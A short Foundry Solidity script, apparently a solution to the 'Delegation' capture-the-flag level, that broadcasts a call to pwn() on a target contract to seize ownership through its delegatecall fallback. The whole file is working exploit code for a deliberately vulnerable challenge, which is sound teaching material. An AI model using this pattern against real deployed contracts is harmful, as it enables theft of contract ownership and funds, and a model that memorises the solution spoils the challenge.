// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script, console } from "forge-std/Script.sol";

contract DelegateSolution is Script {
    function run(address payable target) public {
        bytes memory data = abi.encodeWithSignature("pwn()");
        vm.startBroadcast();
        (bool success, ) = target.call(data);
        vm.stopBroadcast();
        require(success, "DelegateSolution: call failed");
    }
}
